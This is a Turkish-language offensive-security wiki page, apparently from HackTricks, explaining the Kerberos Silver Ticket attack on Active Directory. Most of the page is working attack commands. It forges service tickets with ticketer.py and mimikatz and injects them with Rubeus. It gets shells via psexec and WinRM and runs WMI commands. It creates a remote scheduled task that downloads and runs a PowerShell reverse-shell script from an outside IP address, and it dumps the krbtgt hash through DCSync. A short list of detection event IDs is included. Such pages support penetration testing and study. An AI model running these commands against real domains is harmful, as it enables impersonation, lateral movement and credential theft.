# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

**Silver Ticket** saldırısı, Active Directory (AD) ortamlarında hizmet biletlerinin istismarını içerir. Bu yöntem, **bir hizmet hesabının NTLM hash'ini elde etmeye** dayanır, örneğin bir bilgisayar hesabı, bir Ticket Granting Service (TGS) bileti oluşturmak için. Bu sahte bilet ile bir saldırgan, ağdaki belirli hizmetlere erişebilir, **herhangi bir kullanıcıyı taklit ederek**, genellikle yönetici ayrıcalıkları elde etmeyi hedefler. Biletleri sahtelemek için AES anahtarlarının kullanılmasının daha güvenli ve daha az tespit edilebilir olduğu vurgulanmaktadır.

Bilet oluşturma için, işletim sistemine bağlı olarak farklı araçlar kullanılmaktadır:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Windows'ta
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
CIFS servisi, kurbanın dosya sistemine erişim için yaygın bir hedef olarak öne çıkmaktadır, ancak HOST ve RPCSS gibi diğer hizmetler de görevler ve WMI sorguları için istismar edilebilir.

## Mevcut Hizmetler

| Hizmet Türü                                | Hizmet Gümüş Biletler                                                    |
| ------------------------------------------ | ------------------------------------------------------------------------ |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                |
| PowerShell Uzak Bağlantı                  | <p>HOST</p><p>HTTP</p><p>İşletim sistemine bağlı olarak ayrıca:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Bazı durumlarda sadece şunu isteyebilirsiniz: WINRM</p> |
| Zamanlanmış Görevler                      | HOST                                                                   |
| Windows Dosya Paylaşımı, ayrıca psexec    | CIFS                                                                   |
| LDAP işlemleri, DCSync dahil              | LDAP                                                                   |
| Windows Uzak Sunucu Yönetim Araçları      | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                     |
| Altın Biletler                             | krbtgt                                                                 |

**Rubeus** kullanarak bu biletlerin hepsini aşağıdaki parametre ile **isteyebilirsiniz**:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Gümüş biletler Olay Kimlikleri

- 4624: Hesap Girişi
- 4634: Hesap Çıkışı
- 4672: Yönetici Girişi

## Hizmet biletlerini kötüye kullanma

Aşağıdaki örneklerde, biletin yönetici hesabını taklit ederek alındığını varsayalım.

### CIFS

Bu bilet ile `C$` ve `ADMIN$` klasörlerine **SMB** üzerinden (eğer açığa çıkmışlarsa) erişim sağlayabilir ve uzaktaki dosya sisteminin bir kısmına dosyaları kopyalayabilirsiniz, sadece şunu yaparak:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Ayrıca, **psexec** kullanarak ana bilgisayar içinde bir shell elde edebilir veya rastgele komutlar çalıştırabilirsiniz:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### ANA BİLGİSAYAR

Bu izinle, uzak bilgisayarlarda zamanlanmış görevler oluşturabilir ve rastgele komutlar çalıştırabilirsiniz:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Bu biletlerle **kurban sisteminde WMI'yi çalıştırabilirsiniz**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Daha fazla **wmiexec hakkında bilgi** için aşağıdaki sayfayı ziyaret edin:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Winrm erişimi ile bir bilgisayara **erişebilir** ve hatta bir PowerShell alabilirsiniz:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Aşağıdaki sayfayı kontrol ederek **winrm kullanarak uzaktan bir host ile bağlantı kurmanın daha fazla yolunu** öğrenin:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> **winrm'nin uzaktan bilgisayarda aktif ve dinliyor olması gerektiğini** unutmayın.

### LDAP

Bu ayrıcalıkla **DCSync** kullanarak DC veritabanını dökebilirsiniz:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**DCSync hakkında daha fazla bilgi edinin** aşağıdaki sayfada:

## Referanslar

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
